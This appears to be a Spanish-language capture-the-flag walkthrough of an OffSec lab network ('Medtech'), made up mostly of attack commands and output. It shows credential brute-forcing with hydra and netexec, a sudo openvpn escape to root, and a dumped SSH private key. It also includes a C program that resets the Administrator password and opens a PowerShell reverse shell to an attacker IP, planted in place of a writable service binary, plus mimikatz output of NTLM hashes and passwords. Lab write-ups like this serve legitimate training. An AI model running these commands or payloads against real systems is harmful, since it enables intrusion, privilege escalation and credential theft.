/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       172.16.224.11   5985   FILES02          [-] medtech.com\wario:Mushroom!
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       172.16.224.13   5985   PROD01           [-] medtech.com\wario:Mushroom!

```
> El host perteneciente a wario es 172.16.xxx.83 **CLIENT02**

```
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# evil-winrm -i 172.16.224.83 -u 'wario' -p 'Mushroom!' -P 5985
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\wario\Documents>

```
> Encontramos en el Desktop de wario el flag local

Por el momento no es posible escalar privilegios en wario. Podemos enfocarnos en otro host 

Podemos usar hydra para generar un ataque de fuerza bruta sobre el host que tiene solo el puerto 22 abierto con los usuarios que se encontraron en otras maquinas.

|Usuarios|
|--------|
|Administrator |
|joe|
|wario|
|daisy|
|toad|
|goomba|
|offsec|

> El unico resultado positivo del ataque es

```
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# hydra -l offsec -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.161.122 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-01 10:01:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.161.122:22/
[22][ssh] host: 192.168.161.122   login: offsec   password: password
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-01 10:01:49
```
Encontramos el password de otro host de la DMZ probamos conectarnos por ssh

```
──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# ssh offsec@192.168.161.122
The authenticity of host '192.168.161.122 (192.168.161.122)' can't be established.
ED25519 key fingerprint is SHA256:udGiqS5CWuVlHprkRFQ8yQLekVjoJKlrAiv3UTP6POo.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:40: [hashed name]
    ~/.ssh/known_hosts:43: [hashed name]
    ~/.ssh/known_hosts:47: [hashed name]
    ~/.ssh/known_hosts:49: [hashed name]
    ~/.ssh/known_hosts:52: [hashed name]
    ~/.ssh/known_hosts:53: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.161.122' (ED25519) to the list of known hosts.
offsec@192.168.161.122's password: 
Last login: Tue Feb 11 01:48:54 2025
(lshell) - You are in a limited shell.
Type '?' or 'help' to get the list of allowed commands
offsec:~$
```
> Este es un shell muy limitado que al intentar ejecutar comandos que no estan permitidos al tercer intento bannea al usuario. El comando help muestra los comandos que podemos ejecutar

```
offsec:~$ help
cat  cd  clear  echo  exit  help  history  ll  lpath  ls  lsudo  sudo
```
Popdemos ejecutar sudo y enumerar permisos con `sudo -l`

```bass
offsec:~$ sudo -l
[sudo] password for offsec: 
Matching Defaults entries for offsec on vpn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User offsec may run the following commands on vpn:
    (ALL : ALL) /usr/sbin/openvpn
```

Esto significa que podemos ejecutar openvpn como root. El binario `openvpn` permite ejecucion arbitraria de scripts. 
OpenVPN tiene un parametro **--up** que ejecuta un script como root al levantar la interfaz virtual.
Entonces necesitamos decirle a openvpn que no levante una interfaz, que habilite la ejecucion de scripts externos, y que suba nuestro script,
que probablemente sea un shell sh. El comando queda de la siguiente manera:

```
sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
```
- --dev null: decimos a OpenVPN que no cree una interfaz real.

- --script-security 2: habilita la ejecución de scripts externos.

- --up '/bin/sh -c sh': se ejecuta cuando OpenVPN "levanta" la interfaz. En este caso ejecutamos un shell (sh) a través de sh -c, lo que nos da una shell como root.

```bash
offsec:~$ sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
2025-06-01 13:07:31 Cipher negotiation is disabled since neither P2MP client nor server mode is enabled
2025-06-01 13:07:31 OpenVPN 2.5.5 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Mar 22 2022
2025-06-01 13:07:31 library versions: OpenSSL 3.0.2 15 Mar 2022, LZO 2.10
2025-06-01 13:07:31 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
2025-06-01 13:07:31 ******* WARNING *******: All encryption and authentication features disabled -- All data will be tunnelled as clear text and will not be protected against man-in-the-middle changes. PLEASE DO RECONSIDER THIS CONFIGURATION!                                                                                                                                                                                  
2025-06-01 13:07:31 /bin/sh -c sh null 1500 1500   init                                                                                                                                                           
# whoami                                                                                                                                                                                                          
root                                                                                                                                                                                                              
#
```
A partir de aqui obtenemos los flags:

```
# ls                                                                                                                                                                                                              
local.txt                                                                                                                                                                                                         
# cat local.txt                                                                                                                                                                                                   
68d26dc77fdb06223380e88b299ee42e                                                                                                                                                                                  
# cd /root                                                                                                                                                                                                        
# ls                                                                                                                                                                                                              
proof.txt  scripts  snap                                                                                                                                                                                          
# cat proof.txt
6304e7155658241b7c8953c7fb10ce3f
# 
```

Encontramos un id_rsa en el perfil del usuario **mario**

```
# ls                                                                                                                                                                                                              
mario  offsec                                                                                                                                                                                                     
# cd mario
# cd .ssh
# ls
id_rsa  id_rsa.pub  known_hosts  known_hosts.old
# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
pI77A9Emp3E9cAAAAJbWFyaW9AdnBuAQI=
-----END OPENSSH PRIVATE KEY-----
```

Usamos esa clave privada para conectarnos al usuario **mario** por ssh

```
# ssh -i id_rsa mario@172.16.161.14
The authenticity of host '172.16.161.14 (172.16.161.14)' can't be established.
ED25519 key fingerprint is SHA256:srLYZlCKeyOeH0XD62lR2XSoBZ/uqQ/tVS/YVLY3bF8.
This host key is known by the following other names/addresses:
    /root/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.161.14' (ED25519) to the list of known hosts.
Linux NTP 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Oct  6 11:35:48 2022 from 192.168.118.2
$ whoami
mario
$ hostname
NTP
$ ls
local.txt
$ cat local.txt
96d63c6f4937ce61639742d211e160c5
$
```
Enumerando ambos hosts no obtuvimos informacion reelevante que permitan acceder a otros host en la red MEDTECH
Volvemos al host .121 y enumeramos todo el dominio aprovechando los privilegios administrativos del usuario ADministrator.
Alternativamente podemos intentar con los passwords que ya tenemos y los usuarios generar fuerza bruta para encontrar matches.
generamos una lista de usuarios con los encontrados y algunos mas al azar con tematica "Mario Bros"

```
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# netexec rdp 172.16.161.10 172.16.161.11 172.16.161.12 172.16.161.13 172.16.161.82 172.16.161.83 -u users.txt -d medtech.com -p passwords.txt   
RDP         172.16.161.82   3389   CLIENT01         [*] Windows 10 or Windows Server 2016 Build 22000 (name:CLIENT01) (domain:medtech.com) (nla:True)
RDP         172.16.161.12   3389   DEV04            [*] Windows 10 or Windows Server 2016 Build 20348 (name:DEV04) (domain:medtech.com) (nla:True)
RDP         172.16.161.82   3389   CLIENT01         [-] medtech.com\mario:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.82   3389   CLIENT01         [+] medtech.com\wario:Mushroom! 
RDP         172.16.161.82   3389   CLIENT01         [-] medtech.com\joe:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.82   3389   CLIENT01         [-] medtech.com\offsec:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.82   3389   CLIENT01         [-] medtech.com\goomba:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.82   3389   CLIENT01         [-] medtech.com\toad:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.82   3389   CLIENT01         [-] medtech.com\Administrator:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.82   3389   CLIENT01         [-] medtech.com\daisy:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.82   3389   CLIENT01         [-] medtech.com\donky:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.82   3389   CLIENT01         [+] medtech.com\yoshi:Mushroom! (Pwn3d!)
RDP         172.16.161.12   3389   DEV04            [-] medtech.com\mario:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.12   3389   DEV04            [+] medtech.com\wario:Mushroom! 
RDP         172.16.161.12   3389   DEV04            [-] medtech.com\joe:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.12   3389   DEV04            [-] medtech.com\offsec:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.12   3389   DEV04            [-] medtech.com\goomba:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.12   3389   DEV04            [-] medtech.com\toad:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.12   3389   DEV04            [-] medtech.com\Administrator:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.12   3389   DEV04            [-] medtech.com\daisy:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.12   3389   DEV04            [-] medtech.com\donky:Mushroom! (STATUS_LOGON_FAILURE)
RDP         172.16.161.12   3389   DEV04            [+] medtech.com\yoshi:Mushroom! (Pwn3d!)
```

Vemos que el usuario **yoshi** comparte el mismo password que **wario** y tiene acceso a **CLIENT01** y **DEV04**
Como el servicio que probamos es RDP podemos entrar por rdp en ambos hosts:

> No encontramos nada interesante en CLIENT01 con el usuario yoshi pasamos a DEV04
Al ingresar encontramos el flag local en Desktop
Enumerando encontramos este binario en el cual tenemos permisos de escritura.


```powershell
PS C:\Users\yoshi> Get-Acl C:\TEMP\backup.exe


    Directory: C:\TEMP


Path       Owner                  Access
----       -----                  ------
backup.exe BUILTIN\Administrators MEDTECH\yoshi Allow  Modify, Synchronize...
 
PS C:\Users\yoshi> dir C:\TEMP


    Directory: C:\TEMP


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         10/6/2022   2:02 AM          11776 backup.exe


PS C:\Users\yoshi>
```

#### Generamos un reverseshell en .c para compilar y conectar con nuestro receptor

```powershell
#include <stdlib.h>

int main() {
    // Cambiar contraseña del usuario Administrator
    system("net user Administrator password123!");

    // Agregar Administrator al grupo de Escritorio Remoto
    system("net localgroup \"Remote Desktop Users\" Administrator /add");

    // Iniciar reverse shell usando PowerShell
    system("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \""
           "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.239',4444);"
           "$stream = $client.GetStream();"
           "[byte[]]$bytes = 0..65535|%{0};"
           "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
           " $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
           " $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String );"
           " $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
           " $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
           " $stream.Write($sendbyte,0,$sendbyte.Length);"
           " $stream.Flush()"
           "}\"");

    return 0;
}

```

#### Compilamos

```bash
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# x86_64-w64-mingw32-gcc backup.c -o backup.exe
```

- Subimos el archivo a DEV04 y lo copiamos en el directorio TEMP con el receptor nc escuchando en el puerto 4444

```
Copy-Item .\backup.exe C:\TEMP\backup.exe
```

**En el receptor unos doritos despues >>> **

```
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.45.239] from (UNKNOWN) [192.168.161.121] 61367
whoami
nt authority\system
PS C:\Windows\system32> hostname
DEV04
PS C:\Windows\system32> 
```

**Obtenemos el resto de los flags de DEV04 y exploramos usuarios**

```
PS C:\Windows\system32> cd C:\Users
PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         9/28/2022  12:18 PM                Administrator                                                        
d-----         9/28/2022   5:30 AM                administrator.MEDTECH                                                
d-----         10/6/2022   3:41 AM                leon                                                                 
d-r---         9/28/2022  12:18 PM                Public                                                               
d-----          6/1/2025   5:22 PM                yoshi                                                                


PS C:\Users> 
```
- Obtenemos los flags:

```
PS C:\Users\Administrator\desktop> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/1/2025   3:25 PM             34 proof.txt                                                            


    Directory: C:\Users\yoshi\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/1/2025   3:25 PM             34 local.txt                                                            


PS C:\Users\Administrator\desktop>
```
- **Buscamos credenciales aprovechando los privilegios authority\system subimos mimikatz para extraer hashes NTLM**

```powershell
PS C:\Users\Administrator> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 2297442 (00000000:00230e62)
Session           : RemoteInteractive from 3
User Name         : Administrator
Domain            : DEV04
Logon Server      : DEV04
Logon Time        : 6/2/2025 5:02:59 AM
SID               : S-1-5-21-1033687970-4021173991-2854936728-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : DEV04
         * NTLM     : 8119935c5f7fa5f57135620c8073aaca
         * SHA1     : f60d7d6f41f4e0232b620aa2429cdaba85abc63d
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : DEV04
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : DEV04
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2282488 (00000000:0022d3f8)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/2/2025 5:02:59 AM
SID               : S-1-5-90-0-3
        msv :
         [00000003] Primary
         * Username : DEV04$
         * Domain   : MEDTECH
         * NTLM     : f104e2b90d4a9ede3a8cf4db5472a54d
         * SHA1     : c6dc0a2863e538f26f6e80fdaa148a50625109ab
        tspkg :
        wdigest :
         * Username : DEV04$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DEV04$
         * Domain   : medtech.com
         * Password : b6 50 fa 16 06 e8 a3 48 d8 f8 5d 98 f3 25 bc 8f a4 5a 5a a1 4f 8c ea 31 84 dd 78 ed 01 f3 13 b8 ef 48 48 f8 87 9f 2f d2 5d 65 2b dc fa 01 40 ff e0 e0 9b 01 4f 85 73 af 7a eb 2b a7 45 e0 f0 27 20 fa 6e 9f 4a 59 4c 76 16 a2 c9 6d b0 49 ab 84 fa af 9d 57 5b 2f be 41 46 05 04 4d 95 9b fd 08 af a2 76 1b 50 56 fc d7 a8 8e 93 c6 72 00 f8 31 d0 41 3d 72 da b7 4e a6 a1 d0 36 ad 7b de d3 21 07 4e f2 d0 22 f6 11 13 31 9e b0 bd e5 20 74 f8 6d f3 bb a2 89 56 8b 34 3d 66 af 02 8c 06 d5 5a 4f 25 48 37 4c f3 30 18 7f 2c 87 03 94 7d 14 95 84 9e 96 cb 68 ca d1 84 87 6d 6d 0f d9 8c 71 65 30 f3 3a f5 56 53 ca 49 c9 db 35 04 7a 2f a5 f9 1f 87 69 6e 14 c8 0a f1 e9 8b df a8 0b 2d 02 7f 85 9d 0d 0f 2c 3d 25 45 f2 b1 02 e2 91 8e 89 2a
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 1343591 (00000000:00148067)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/2/2025 4:42:05 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : DEV04$
         * Domain   : MEDTECH
         * NTLM     : f104e2b90d4a9ede3a8cf4db5472a54d
         * SHA1     : c6dc0a2863e538f26f6e80fdaa148a50625109ab
        tspkg :
        wdigest :
         * Username : DEV04$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DEV04$
         * Domain   : medtech.com
         * Password : b6 50 fa 16 06 e8 a3 48 d8 f8 5d 98 f3 25 bc 8f a4 5a 5a a1 4f 8c ea 31 84 dd 78 ed 01 f3 13 b8 ef 48 48 f8 87 9f 2f d2 5d 65 2b dc fa 01 40 ff e0 e0 9b 01 4f 85 73 af 7a eb 2b a7 45 e0 f0 27 20 fa 6e 9f 4a 59 4c 76 16 a2 c9 6d b0 49 ab 84 fa af 9d 57 5b 2f be 41 46 05 04 4d 95 9b fd 08 af a2 76 1b 50 56 fc d7 a8 8e 93 c6 72 00 f8 31 d0 41 3d 72 da b7 4e a6 a1 d0 36 ad 7b de d3 21 07 4e f2 d0 22 f6 11 13 31 9e b0 bd e5 20 74 f8 6d f3 bb a2 89 56 8b 34 3d 66 af 02 8c 06 d5 5a 4f 25 48 37 4c f3 30 18 7f 2c 87 03 94 7d 14 95 84 9e 96 cb 68 ca d1 84 87 6d 6d 0f d9 8c 71 65 30 f3 3a f5 56 53 ca 49 c9 db 35 04 7a 2f a5 f9 1f 87 69 6e 14 c8 0a f1 e9 8b df a8 0b 2d 02 7f 85 9d 0d 0f 2c 3d 25 45 f2 b1 02 e2 91 8e 89 2a
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 1342210 (00000000:00147b02)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/2/2025 4:42:05 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : DEV04$
         * Domain   : MEDTECH
         * NTLM     : f104e2b90d4a9ede3a8cf4db5472a54d
         * SHA1     : c6dc0a2863e538f26f6e80fdaa148a50625109ab
        tspkg :
        wdigest :
         * Username : DEV04$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DEV04$
         * Domain   : medtech.com
         * Password : b6 50 fa 16 06 e8 a3 48 d8 f8 5d 98 f3 25 bc 8f a4 5a 5a a1 4f 8c ea 31 84 dd 78 ed 01 f3 13 b8 ef 48 48 f8 87 9f 2f d2 5d 65 2b dc fa 01 40 ff e0 e0 9b 01 4f 85 73 af 7a eb 2b a7 45 e0 f0 27 20 fa 6e 9f 4a 59 4c 76 16 a2 c9 6d b0 49 ab 84 fa af 9d 57 5b 2f be 41 46 05 04 4d 95 9b fd 08 af a2 76 1b 50 56 fc d7 a8 8e 93 c6 72 00 f8 31 d0 41 3d 72 da b7 4e a6 a1 d0 36 ad 7b de d3 21 07 4e f2 d0 22 f6 11 13 31 9e b0 bd e5 20 74 f8 6d f3 bb a2 89 56 8b 34 3d 66 af 02 8c 06 d5 5a 4f 25 48 37 4c f3 30 18 7f 2c 87 03 94 7d 14 95 84 9e 96 cb 68 ca d1 84 87 6d 6d 0f d9 8c 71 65 30 f3 3a f5 56 53 ca 49 c9 db 35 04 7a 2f a5 f9 1f 87 69 6e 14 c8 0a f1 e9 8b df a8 0b 2d 02 7f 85 9d 0d 0f 2c 3d 25 45 f2 b1 02 e2 91 8e 89 2a
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 291481 (00000000:00047299)
Session           : Interactive from 1
User Name         : leon
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 7/23/2024 10:38:20 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1105
        msv :
         [00000003] Primary
         * Username : leon
         * Domain   : MEDTECH
         * NTLM     : 2e208ad146efda5bc44869025e06544a
         * SHA1     : 8d1c9e13d2d2c20dbee8b4eacb20b73f06573c96
         * DPAPI    : a7bad14f64c3cf0d7ae2b5f6392a0b6d
        tspkg :
        wdigest :
         * Username : leon
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : leon
         * Domain   : MEDTECH.COM
         * Password : rabbit:)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 74679 (00000000:000123b7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/23/2024 10:37:56 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DEV04$
         * Domain   : MEDTECH
         * NTLM     : f104e2b90d4a9ede3a8cf4db5472a54d
         * SHA1     : c6dc0a2863e538f26f6e80fdaa148a50625109ab
        tspkg :
        wdigest :
         * Username : DEV04$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : DEV04$
         * Domain   : medtech.com
         * Password : b6 50 fa 16 06 e8 a3 48 d8 f8 5d 98 f3 25 bc 8f a4 5a 5a a1 4f 8c ea 31 84 dd 78 ed 01 f3 13 b8 ef 48 48 f8 87 9f 2f d2 5d 65 2b dc fa 01 40 ff e0 e0 9b 01 4f 85 73 af 7a eb 2b a7 45 e0 f0 27 20 fa 6e 9f 4a 59 4c 76 16 a2 c9 6d b0 49 ab 84 fa af 9d 57 5b 2f be 41 46 05 04 4d 95 9b fd 08 af a2 76 1b 50 56 fc d7 a8 8e 93 c6 72 00 f8 31 d0 41 3d 72 da b7 4e a6 a1 d0 36 ad 7b de d3 21 07 4e f2 d0 22 f6 11 13 31 9e b0 bd e5 20 74 f8 6d f3 bb a2 89 56 8b 34 3d 66 af 02 8c 06 d5 5a 4f 25 48 37 4c f3 30 18 7f 2c 87 03 94 7d 14 95 84 9e 96 cb 68 ca d1 84 87 6d 6d 0f d9 8c 71 65 30 f3 3a f5 56 53 ca 49 c9 db 35 04 7a 2f a5 f9 1f 87 69 6e 14 c8 0a f1 e9 8b df a8 0b 2d 02 7f 85 9d 0d 0f 2c 3d 25 45 f2 b1 02 e2 91 8e 89 2a
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DEV04$
Domain            : MEDTECH
Logon Server      : (null)
Logon Time        : 7/23/2024 10:37:55 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DEV04$
         * Domain   : MEDTECH
         * NTLM     : f104e2b90d4a9ede3a8cf4db5472a54d
         * SHA1     : c6dc0a2863e538f26f6e80fdaa148a50625109ab
        tspkg :
        wdigest :
         * Username : DEV04$
         * Domain   : MEDTECH
         * Password : (null)
        kerberos :
         * Username : dev04$
         * Domain   : MEDTECH.COM
